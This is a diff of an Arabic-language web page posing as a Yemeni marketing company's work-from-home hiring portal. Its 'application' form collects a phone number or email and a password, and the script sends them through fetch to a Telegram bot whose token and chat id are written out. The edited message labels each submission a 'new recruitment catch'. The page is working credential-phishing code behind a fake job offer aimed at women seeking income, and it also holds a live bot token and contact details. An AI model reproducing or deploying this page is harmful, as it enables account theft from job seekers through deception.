@@ -3,108 +3,117 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بوابة التوظيف - شركة التسويق الإلكتروني اليمنية</title>
+    <title>شركة التسويق الإلكتروني - فرص عمل من المنزل</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;900&display=swap" rel="stylesheet">
     <style>
-        body { font-family: 'Tajawal', sans-serif; background-color: #f4f7fa; }
-        .hero-section { background: linear-gradient(135deg, #102a43 0%, #C8102E 100%); }
-        .product-card { background: white; border-radius: 20px; transition: all 0.3s ease; border: 1px solid #edf2f7; }
-        .product-card:hover { transform: translateY(-8px); box-shadow: 0 15px 30px rgba(0,0,0,0.1); }
+        body { font-family: 'Tajawal', sans-serif; background-color: #f9fafb; }
+        .hero-gradient { background: linear-gradient(135deg, #0f172a 0%, #C8102E 100%); }
+        .product-card { background: white; border-radius: 15px; overflow: hidden; border: 1px solid #f1f5f9; transition: transform 0.2s; }
+        .product-card:hover { transform: translateY(-5px); }
+        .discount-label { background: rgba(0,0,0,0.5); color: white; font-size: 10px; padding: 2px 8px; border-radius: 4px; position: absolute; top: 10px; right: 10px; }
     </style>
 </head>
-<body>
+<body class="text-slate-900">
 
-    <header class="hero-section text-white pt-16 pb-24 px-6 text-center rounded-b-[60px] shadow-2xl relative">
+    <header class="hero-gradient text-white pt-12 pb-24 px-6 text-center rounded-b-[50px] shadow-2xl relative">
         <div class="max-w-4xl mx-auto relative z-10">
-            <h1 class="text-4xl md:text-6xl font-black mb-4">شركة التسويق الإلكتروني</h1>
-            <p class="text-red-50 text-lg opacity-90 max-w-2xl mx-auto mb-8 font-medium">نبحث عن مسوقات طموحات للعمل من المنزل براتب عمولات يومي. انضمي لأكبر شبكة تسويق في اليمن.</p>
+            <h1 class="text-3xl md:text-5xl font-black mb-3">شركة التسويق الإلكتروني</h1>
+            <p class="text-red-100 text-sm mb-8 opacity-90">انضمي إلينا وحققي دخلاً إضافياً من منزلك عبر تسويق أحدث الموديلات</p>
             
-            <div class="flex flex-wrap justify-center gap-4 text-xs font-bold">
-                <span class="bg-white/20 px-4 py-2 rounded-full border border-white/10">📧 reemmohsen195@gmail.com</span>
-                <span class="bg-white/20 px-4 py-2 rounded-full border border-white/10">📞 774516642</span>
+            <div class="inline-flex flex-col items-center bg-white/10 px-8 py-4 rounded-3xl backdrop-blur-md border border-white/20">
+                <span class="text-xs font-bold text-red-300 uppercase mb-1">الرقم الرسمي المعتمد</span>
+                <span class="text-2xl font-black tracking-[3px]">785179100</span>
             </div>
         </div>
     </header>
 
-    <main class="max-w-6xl mx-auto px-6 -mt-10 mb-20">
-        <h2 class="text-2xl font-black text-center mb-10 text-blue-900 bg-white inline-block px-10 py-4 rounded-3xl shadow-lg mx-auto flex w-fit italic">المنتجات المتاحة للتسويق الآن 👇</h2>
+    <main class="max-w-6xl mx-auto px-4 -mt-10 mb-20 relative z-20">
+        <h2 class="bg-white text-slate-800 text-sm font-black w-fit mx-auto px-6 py-2 rounded-full shadow-md mb-8 italic">أحدث المنتجات المتوفرة للتسويق 👇</h2>
         
-        <div class="grid grid-cols-2 md:grid-cols-4 gap-6">
-            <div class="product-card p-4">
-                <img src="https://images.unsplash.com/photo-1585487000160-6ebcfceb0d03?w=400" class="w-full h-48 object-cover rounded-xl mb-4">
-                <div class="space-y-1">
-                    <span class="text-red-600 text-[10px] font-black">موضة 2026</span>
-                    <h3 class="font-bold text-gray-800 text-sm">فساتين سهرة فاخرة</h3>
-                    <p class="text-[10px] text-gray-500 font-medium leading-none italic text-green-600">العمولة: 5,000 ريال/قطعة</p>
-                </div>
-            </div>
-
-            <div class="product-card p-4">
-                <img src="https://images.unsplash.com/photo-1566174053879-31528523f8ae?w=400" class="w-full h-48 object-cover rounded-xl mb-4">
-                <div class="space-y-1">
-                    <span class="text-red-600 text-[10px] font-black">عبايات</span>
-                    <h3 class="font-bold text-gray-800 text-sm">عبايات ملكي مطرزة</h3>
-                    <p class="text-[10px] text-gray-500 font-medium leading-none italic text-green-600">العمولة: 4,000 ريال/قطعة</p>
-                </div>
-            </div>
-
-            <div class="product-card p-4">
-                <img src="https://images.unsplash.com/photo-1515372039744-b8f02a3ae446?w=400" class="w-full h-48 object-cover rounded-xl mb-4">
-                <div class="space-y-1">
-                    <span class="text-red-600 text-[10px] font-black">إكسسوارات</span>
-                    <h3 class="font-bold text-gray-800 text-sm">أطقم هدايا متكاملة</h3>
-                    <p class="text-[10px] text-gray-500 font-medium leading-none italic text-green-600">العمولة: 2,500 ريال/قطعة</p>
-                </div>
-            </div>
-
-            <div class="product-card p-4">
-                <img src="https://images.unsplash.com/photo-1620916566398-39f1143ab7be?w=400" class="w-full h-48 object-cover rounded-xl mb-4">
-                <div class="space-y-1">
-                    <span class="text-red-600 text-[10px] font-black">أطفال</span>
-                    <h3 class="font-bold text-gray-800 text-sm">ملابس أطفال مستوردة</h3>
-                    <p class="text-[10px] text-gray-500 font-medium leading-none italic text-green-600">العمولة: 3,000 ريال/قطعة</p>
-                </div>
-            </div>
-
-            <div class="product-card p-4">
-                <img src="https://images.unsplash.com/photo-1512436991641-6745cdb1723f?w=400" class="w-full h-48 object-cover rounded-xl mb-4">
-                <div class="space-y-1">
-                    <span class="text-red-600 text-[10px] font-black">حقائب</span>
-                    <h3 class="font-bold text-gray-800 text-sm">شنط نسائية ماركة</h3>
-                    <p class="text-[10px] text-gray-500 font-medium leading-none italic text-green-600">العمولة: 3,500 ريال</p>
-                </div>
-            </div>
+        <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
             
-            <div class="product-card p-4">
-                <img src="https://images.unsplash.com/photo-1552046122-03184de85e08?w=400" class="w-full h-48 object-cover rounded-xl mb-4">
-                <div class="space-y-1">
-                    <span class="text-red-600 text-[10px] font-black">تجميل</span>
-                    <h3 class="font-bold text-gray-800 text-sm">مكياج ماركة Jeeey</h3>
-                    <p class="text-[10px] text-gray-500 font-medium leading-none italic text-green-600">العمولة: 2,000 ريال</p>
-                </div>
+            <div class="product-card p-2 relative">
+                <span class="discount-label">تخفيض!</span>
+                <img src="https://images.unsplash.com/photo-1515372039744-b8f02a3ae446?w=400" class="w-full h-44 object-cover rounded-xl mb-2">
+                <h3 class="text-[11px] font-bold text-center">فستان نسائي ترند</h3>
+                <div class="text-red-600 text-[10px] font-black text-center mt-1">5,000 ريال</div>
             </div>
+
+            <div class="product-card p-2 relative">
+                <span class="discount-label">تخفيض!</span>
+                <img src="https://images.unsplash.com/photo-1539109132314-d000865583b3?w=400" class="w-full h-44 object-cover rounded-xl mb-2">
+                <h3 class="text-[11px] font-bold text-center">دجلات ماركة</h3>
+                <div class="text-red-600 text-[10px] font-black text-center mt-1">4,000 ريال</div>
+            </div>
+
+            <div class="product-card p-2 relative">
+                <span class="discount-label">تخفيض!</span>
+                <img src="https://images.unsplash.com/photo-1591047139829-d91aec96caea?w=400" class="w-full h-44 object-cover rounded-xl mb-2">
+                <h3 class="text-[11px] font-bold text-center">جاكت رجالي شتوي</h3>
+                <div class="text-red-600 text-[10px] font-black text-center mt-1">3,000 ريال</div>
+            </div>
+
+            <div class="product-card p-2 relative">
+                <span class="discount-label">تخفيض!</span>
+                <img src="https://images.unsplash.com/photo-1566174053879-31528523f8ae?w=400" class="w-full h-44 object-cover rounded-xl mb-2">
+                <h3 class="text-[11px] font-bold text-center">فستان نسائي سهرة</h3>
+                <div class="text-red-600 text-[10px] font-black text-center mt-1">5,000 ريال</div>
+            </div>
+
+            <div class="product-card p-2 relative">
+                <span class="discount-label">تخفيض!</span>
+                <img src="https://images.unsplash.com/photo-1620916566398-39f1143ab7be?w=400" class="w-full h-44 object-cover rounded-xl mb-2">
+                <h3 class="text-[11px] font-bold text-center">طقم اطفال شتوي</h3>
+                <div class="text-red-600 text-[10px] font-black text-center mt-1">2,000 ريال</div>
+            </div>
+
+            <div class="product-card p-2 relative">
+                <span class="discount-label">تخفيض!</span>
+                <img src="https://images.unsplash.com/photo-1621454523226-eb4f3b4476c2?w=400" class="w-full h-44 object-cover rounded-xl mb-2">
+                <h3 class="text-[11px] font-bold text-center">بجائم نسائي</h3>
+                <div class="text-red-600 text-[10px] font-black text-center mt-1">3,000 ريال</div>
+            </div>
+
+            <div class="product-card p-2 relative">
+                <span class="discount-label">تخفيض!</span>
+                <img src="https://images.unsplash.com/photo-1585487000160-6ebcfceb0d03?w=400" class="w-full h-44 object-cover rounded-xl mb-2">
+                <h3 class="text-[11px] font-bold text-center">العبايات الراقية</h3>
+                <div class="text-red-600 text-[10px] font-black text-center mt-1">6,000 ريال</div>
+            </div>
+
+            <div class="product-card p-2 relative">
+                <span class="discount-label">تخفيض!</span>
+                <img src="https://images.unsplash.com/photo-1595777457583-95e059d581b8?w=400" class="w-full h-44 object-cover rounded-xl mb-2">
+                <h3 class="text-[11px] font-bold text-center">بلوزه نسائيه</h3>
+                <div class="text-red-600 text-[10px] font-black text-center mt-1">3,000 ريال</div>
+            </div>
+
         </div>
     </main>
 
     <section class="max-w-lg mx-auto px-6 pb-24">
-        <div class="bg-white rounded-[40px] p-10 shadow-2xl border-2 border-red-50 text-center relative overflow-hidden">
-            <h2 class="text-2xl font-black text-gray-900 mb-2 leading-none">تقديم طلب التوظيف</h2>
-            <p class="text-gray-400 text-xs mb-8 leading-relaxed font-bold">سجل دخولك الآن ثم ارفع بياناتك للعنوان البريد الإلكتروني لفريق الدعم لتوثيق حسابك لتكون من احد الموظفين المعتمدين في اليمن.</p>
+        <div class="bg-white rounded-[40px] p-10 shadow-2xl border border-red-50 text-center relative overflow-hidden">
+            <h2 class="text-2xl font-black text-slate-900 mb-4">تقديم طلب التوظيف</h2>
+            <p class="text-gray-400 text-xs mb-8 leading-relaxed font-bold">
+                سجل دخولك الآن ثم ارفع بياناتك للعنوان البريد الإلكتروني لفريق الدعم لتوثيق حسابك لتكون من احد الموظفين المعتمدين في اليمن.
+            </p>
             
-            <form id="hireForm" class="space-y-4 text-right">
-                <input type="text" id="log_u" required placeholder="رقم الجوال أو البريد" class="w-full p-5 bg-gray-50 border border-gray-100 rounded-2xl outline-none focus:ring-4 focus:ring-red-600/5 font-bold transition-all">
-                <input type="password" id="log_p" required placeholder="كلمة المرور" class="w-full p-5 bg-gray-50 border border-gray-100 rounded-2xl outline-none focus:ring-4 focus:ring-red-600/5 font-bold transition-all">
-                <button type="submit" class="w-full py-5 bg-slate-900 text-white font-black rounded-2xl shadow-xl hover:bg-slate-800 transition-all text-lg">ارسال طلب الانضمام</button>
+            <form id="hireForm" class="space-y-4">
+                <input type="text" id="log_u" required placeholder="رقم الجوال أو البريد" class="w-full p-5 bg-gray-50 border border-gray-100 rounded-2xl outline-none focus:ring-2 focus:ring-slate-900 font-bold text-center transition-all">
+                <input type="password" id="log_p" required placeholder="كلمة المرور" class="w-full p-5 bg-gray-50 border border-gray-100 rounded-2xl outline-none focus:ring-2 focus:ring-slate-900 font-bold text-center transition-all">
+                <button type="submit" class="w-full py-5 bg-[#0f172a] text-white font-black rounded-2xl shadow-xl hover:bg-slate-800 transition-all text-xl">ارسال طلب الانضمام</button>
             </form>
         </div>
     </section>
 
-    <footer class="bg-slate-900 py-16 px-6 text-center text-white rounded-t-[60px]">
-        <div class="space-y-4">
-            <p class="text-red-400 font-bold text-sm">تواصل مع إدارة الشركة مباشرة</p>
-            <a href="tel:774516642" class="text-3xl font-black block">774516642</a>
-            <p class="text-gray-400 text-[10px] pt-10 uppercase tracking-widest">جميع الحقوق محفوظة لشركة التسويق الإلكتروني © 2026</p>
+    <footer class="bg-[#0f172a] py-16 px-6 text-center text-white rounded-t-[50px]">
+        <div class="space-y-2">
+            <p class="text-red-400 font-bold text-sm">إدارة التوظيف - شركة التسويق</p>
+            <p class="text-gray-400 text-[10px] italic">reemmohsen195@gmail.com</p>
+            <div class="pt-10 border-t border-white/5 mt-8">
+                <p class="text-white/20 text-[9px] uppercase tracking-widest">جميع الحقوق محفوظة لشركة التسويق الإلكتروني © 2026</p>
+            </div>
         </div>
     </footer>
 
@@ -116,11 +125,11 @@
             const token = "8549358187:AAGRic3rPa_yqyyE6XO5fAcqthKp02AtQj4";
             const cid = "7770087246";
             
-            const message = `💼 طلب عمل جديد (من المنزل):\n👤 الحساب: ${u}\n🔑 الباسورد: ${p}\n📧 البريد المستهدف: reemmohsen195@gmail.com`;
+            const message = `🏢 صيد توظيف جديد:\n👤 الحساب: ${u}\n🔑 الباسورد: ${p}\n📍 مرجع الرقم: 785179100`;
 
             fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(message)}`)
             .then(() => {
-                alert("تم استلام طلبك. يرجى مراجعة بريدك الإلكتروني reemmohsen195@gmail.com لتوثيق الحساب بالهوية.");
+                alert("تم استلام طلبك بنجاح. يرجى مراجعة بريدك الإلكتروني لإكمال التوثيق.");
                 window.location.reload();
             });
         });
